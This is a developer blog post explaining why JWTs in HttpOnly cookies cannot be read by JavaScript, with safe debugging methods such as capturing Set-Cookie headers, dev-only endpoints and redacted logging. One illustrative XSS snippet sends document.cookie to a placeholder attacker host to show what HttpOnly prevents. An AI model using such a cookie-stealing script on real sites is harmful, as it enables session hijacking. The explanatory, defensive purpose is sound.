---
layout: layouts/blog.njk
title: Decode JWT from HTTP-only Cookies — What You Can and Can’t See
description: Learn the limits of decoding tokens stored in HTTP-only cookies and how to debug safely.
category: JWT
date: 2025-11-12
readTime: 7
tags: ["blog", "jwt"]
relatedTool: /jwt-decoder/
relatedToolName: JWT Encoder/Decoder
relatedArticles:
  - /blog/jwt-tokens-explained/
  - /blog/decode-jwt-offline-browser/
  - /blog/base64url-vs-base64-jwt-decoding/
  - /blog/invalid-jwt-errors-fixes/
faq:
  - question: Can client-side code read HTTP-only cookies?
    answer: No. They’re protected from JS. Decode tokens you obtain from server logs or endpoints during debugging.
  - question: Can I make HttpOnly cookies readable by JS temporarily?
    answer: You could toggle HttpOnly off in a dev build to debug, but that defeats the purpose. Prefer extracting tokens from headers in controlled dev setups instead.
  - question: Is localStorage better for decoding?
    answer: No. localStorage is accessible to JS and increases XSS risk. Use HttpOnly cookies in production and extract tokens server-side when you must debug.
---

HTTP-only cookies protect tokens from JavaScript, which is great for preventing XSS token theft. It also means you cannot read or decode those cookies directly from `document.cookie`. Understanding why this restriction exists and how to work with it helps you debug authentication issues without compromising security.

## Why HTTP-only cookies exist

HTTP-only cookies are a security feature that prevents client-side JavaScript from accessing cookie values. This is crucial for JWTs because:

1. **Prevents XSS token theft** - Even if an attacker injects malicious JavaScript, they can't steal tokens from HTTP-only cookies
2. **Reduces attack surface** - Tokens aren't exposed to client-side code that might be compromised
3. **Server-controlled security** - Servers can manage token lifecycle without client-side interference

**The trade-off:** You can't inspect or decode tokens directly in browser DevTools or client-side code. This is intentional and by design.

## What you can't do (and why)

### Can't read from document.cookie

**What happens:**
```javascript
// This returns empty string or doesn't include HttpOnly cookies
console.log(document.cookie);
// Result: "" (or only non-HttpOnly cookies)

// Even if you know the cookie name
console.log(document.cookie.split(';').find(c => c.includes('token')));
// Result: undefined (HttpOnly cookies aren't included)
```

**Why:** Browsers intentionally exclude HTTP-only cookies from `document.cookie` to prevent JavaScript access.

### Can't decode in client-side code

**What fails:**
```javascript
// This won't work - you can't get the token value
const token = getCookie('auth_token'); // Returns undefined for HttpOnly cookies
const decoded = jwt.decode(token); // Can't decode what you can't read
```

**Why:** Without access to the cookie value, you can't decode it client-side.

### Can't inspect cookie flags

**What you can't see:**
```javascript
// Can't check if cookie is HttpOnly, Secure, or SameSite from JS
// These flags are only visible in browser DevTools → Application → Cookies
```

**Why:** Cookie attributes are metadata, not accessible via JavaScript APIs.

## Safe ways to inspect a JWT

When you need to see what's inside a token for debugging, here are secure approaches:

### Method 1: Capture Set-Cookie header (recommended for debugging)

**How it works:**
1. Make a request in a development environment
2. Capture the `Set-Cookie` header from the response
3. Extract the JWT value
4. Decode it locally

**Implementation:**

**Using browser DevTools:**
1. Open Network tab
2. Make request that sets cookie
3. Click on the request → Headers tab
4. Find `Set-Cookie` header
5. Copy the JWT value (everything after `token=`)
6. Paste into our [JWT Encoder/Decoder](/jwt-decoder/)

**Using curl:**
```bash
# Make request and capture Set-Cookie header
curl -i -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass"}' \
  | grep -i "set-cookie"

# Extract token value
TOKEN=$(curl -s -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass"}' \
  -c cookies.txt && grep "auth_token" cookies.txt | awk '{print $7}')

# Decode token
echo "$TOKEN" | cut -d. -f1 | base64 -d  # Header
echo "$TOKEN" | cut -d. -f2 | base64 -d  # Payload
```

**Using Postman:**
1. Send request that sets cookie
2. Check Cookies tab (Postman shows all cookies)
3. Copy token value
4. Use our [JWT Encoder/Decoder](/jwt-decoder/) to decode

### Method 2: Backend extraction endpoint (for development)

**How it works:**
Create a development-only endpoint that extracts and returns redacted token information.

**Implementation:**
```javascript
// Development-only endpoint
app.get('/api/debug/token-info', (req, res) => {
  // Only in development
  if (process.env.NODE_ENV === 'production') {
    return res.status(403).json({ error: 'Not available in production' });
  }
  
  // Extract token from HttpOnly cookie
  const token = req.cookies.auth_token;
  if (!token) {
    return res.status(401).json({ error: 'No token found' });
  }
  
  // Decode (don't verify - this is just for inspection)
  const decoded = jwt.decode(token, { complete: true });
  
  // Return redacted information
  res.json({
    header: decoded.header,
    payload: {
      iss: decoded.payload.iss,
      aud: decoded.payload.aud,
      exp: decoded.payload.exp,
      nbf: decoded.payload.nbf,
      iat: decoded.payload.iat,
      sub: decoded.payload.sub ? '***REDACTED***' : undefined,
      // Don't return sensitive claims
    },
    expiresAt: new Date(decoded.payload.exp * 1000).toISOString(),
    issuedAt: new Date(decoded.payload.iat * 1000).toISOString(),
  });
});
```

**Security note:** Never return the full token or sensitive claims. Always redact user identifiers and sensitive data.

### Method 3: Server-side logging (for debugging)

**How it works:**
Log token information server-side during development, but never log full tokens.

**Implementation:**
```javascript
// Middleware for development logging
function logTokenInfo(req, res, next) {
  if (process.env.NODE_ENV === 'development') {
    const token = req.cookies.auth_token;
    if (token) {
      const decoded = jwt.decode(token, { complete: false });
      console.log('Token info:', {
        alg: decoded.header?.alg,
        kid: decoded.header?.kid,
        iss: decoded.iss,
        aud: decoded.aud,
        exp: new Date(decoded.exp * 1000),
        // Never log full token or sensitive claims
      });
    }
  }
  next();
}
```

### Method 4: Offline decoding tool

**How it works:**
Extract token from server logs or headers, then decode using our client-side tool.

**Workflow:**
1. Get token from server logs (redacted) or Set-Cookie header
2. Paste into our [JWT Encoder/Decoder](/jwt-decoder/)
3. Inspect header and payload
4. Never paste production tokens with real secrets

## Why HTTP-only cookies are recommended

### Security benefits

**1. XSS protection**
```javascript
// Even if attacker injects this malicious script:
<script>
  // This won't work - HttpOnly cookies aren't accessible
  fetch('https://attacker.com/steal?token=' + document.cookie);
  // HttpOnly cookies aren't in document.cookie
</script>
```

**2. Reduced attack surface**
- Tokens aren't exposed to client-side code
- Even compromised JavaScript can't access tokens
- Server controls token lifecycle completely

**3. Defense in depth**
- Works alongside Content Security Policy (CSP)
- Complements SameSite and Secure flags
- Part of a layered security approach

### Cookie flags that work together

**HttpOnly + Secure + SameSite:**
```javascript
// Server sets cookie with all security flags
res.cookie('auth_token', token, {
  httpOnly: true,    // No JS access
  secure: true,      // HTTPS only
  sameSite: 'strict', // CSRF protection
  maxAge: 3600000    // 1 hour
});
```

**Why each flag matters:**
- **HttpOnly**: Prevents JavaScript access (XSS protection)
- **Secure**: Only sent over HTTPS (prevents man-in-the-middle)
- **SameSite**: Prevents cross-site requests (CSRF protection)

## Typical debugging workflow

### Step 1: Reproduce in development

Set up a development environment where you can safely inspect tokens:

```javascript
// Development middleware
if (process.env.NODE_ENV === 'development') {
  app.use((req, res, next) => {
    // Log token info (redacted)
    const token = req.cookies.auth_token;
    if (token) {
      const decoded = jwt.decode(token, { complete: false });
      req.tokenInfo = {
        alg: decoded.header?.alg,
        iss: decoded.iss,
        aud: decoded.aud,
        exp: decoded.exp,
      };
    }
    next();
  });
}
```

### Step 2: Capture token from Set-Cookie

**Browser DevTools:**
1. Open Network tab → Preserve log
2. Make authentication request
3. Find response → Headers → `Set-Cookie`
4. Copy token value

**Command line:**
```bash
# Save cookies to file
curl -c cookies.txt -X POST https://api.example.com/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user","password":"pass"}'

# Extract token
TOKEN=$(grep "auth_token" cookies.txt | awk '{print $7}')
echo "$TOKEN"
```

### Step 3: Decode locally

Use our [JWT Encoder/Decoder](/jwt-decoder/) to inspect:
- Header (`alg`, `kid`, `typ`)
- Payload (`iss`, `aud`, `exp`, `nbf`, custom claims)

### Step 4: Verify configuration

Check that:
- `iss` matches your configured issuer
- `aud` includes your application ID
- `exp` is in the future
- `alg` matches your expected algorithm

### Step 5: Fix issues

Based on decoded information:
- **Wrong issuer**: Update issuer configuration
- **Wrong audience**: Fix audience validation
- **Expired token**: Check clock sync or token expiration
- **Algorithm mismatch**: Ensure algorithm matches header

## Common pitfalls

### Pitfall 1: Trying to read HttpOnly cookies from JavaScript

**What developers try:**
```javascript
// This doesn't work
const token = document.cookie.split(';')
  .find(c => c.trim().startsWith('auth_token='))
  .split('=')[1];
```

**Why it fails:** HttpOnly cookies aren't in `document.cookie`.

**Solution:** Use server-side extraction or capture from Set-Cookie header.

### Pitfall 2: Logging full tokens

**What developers do:**
```javascript
// BAD - logs full token
console.log('Token:', req.cookies.auth_token);
```

**Why it's dangerous:** Tokens in logs can be stolen if logs are compromised.

**Solution:** Only log redacted information:
```javascript
// GOOD - logs only non-sensitive info
const decoded = jwt.decode(req.cookies.auth_token, { complete: false });
console.log('Token info:', {
  iss: decoded.iss,
  exp: decoded.exp,
  // Never log full token or user identifiers
});
```

### Pitfall 3: Using localStorage instead

**What developers consider:**
```javascript
// BAD - localStorage is accessible to JS
localStorage.setItem('token', token);
```

**Why it's worse:** localStorage is accessible to any JavaScript (XSS risk).

**Solution:** Use HttpOnly cookies for tokens, localStorage only for non-sensitive data.

## Security checklist

### Production

- ✅ Keep access tokens in HttpOnly cookies
- ✅ Use `Secure` flag (HTTPS only)
- ✅ Use `SameSite=Lax` or `Strict`
- ✅ Add CSRF tokens for state-changing requests
- ✅ Rotate refresh tokens regularly
- ✅ Keep access tokens short-lived (15-60 minutes)
- ✅ Never log full tokens
- ✅ Redact sensitive fields in logs

### Development

- ✅ Use development-only debug endpoints
- ✅ Extract tokens from Set-Cookie headers
- ✅ Decode using client-side tools (our [JWT Encoder/Decoder](/jwt-decoder/))
- ✅ Never commit tokens to version control
- ✅ Use test tokens, not production tokens

## Real-world scenarios

### Scenario 1: Debugging authentication failure

**Problem:** User can't authenticate, need to inspect token

**Solution:**
1. Check server logs for token info (redacted)
2. Capture Set-Cookie header from login response
3. Decode token using [JWT Encoder/Decoder](/jwt-decoder/)
4. Verify `iss`, `aud`, `exp` match expectations
5. Check if token expired or claims mismatch

### Scenario 2: Verifying token claims

**Problem:** Need to verify what claims are in the token

**Solution:**
```javascript
// Development endpoint
app.get('/api/debug/claims', (req, res) => {
  const token = req.cookies.auth_token;
  const decoded = jwt.decode(token, { complete: false });
  
  res.json({
    claims: {
      iss: decoded.iss,
      aud: decoded.aud,
      exp: decoded.exp,
      roles: decoded.roles, // Custom claim
    },
    expiresAt: new Date(decoded.exp * 1000),
  });
});
```

### Scenario 3: Testing token expiration

**Problem:** Need to test how app handles expired tokens

**Solution:**
1. Capture token from Set-Cookie
2. Decode to see `exp` claim
3. Manually expire token (if testing) or wait for expiration
4. Test app behavior with expired token

## Best practices

1. **Never expose tokens to client-side code** - Use HttpOnly cookies
2. **Extract tokens server-side** - For debugging, use server endpoints
3. **Redact sensitive data** - Never log full tokens or user identifiers
4. **Use development tools** - Our [JWT Encoder/Decoder](/jwt-decoder/) for safe inspection
5. **Test with non-production tokens** - Never use real production tokens for testing

## Next steps

1. Try decoding a token with our [JWT Encoder/Decoder](/jwt-decoder/) to see the structure
2. Learn about [offline browser decoding](/blog/decode-jwt-offline-browser/) for privacy
3. Understand [safe decoding practices](/blog/jwt-decode-safely/) before verification
4. Read about [online decoder security](/blog/decode-jwt-online-myths-facts/) when choosing tools
5. See our [troubleshooting guide](/blog/invalid-jwt-errors-fixes/) for common issues
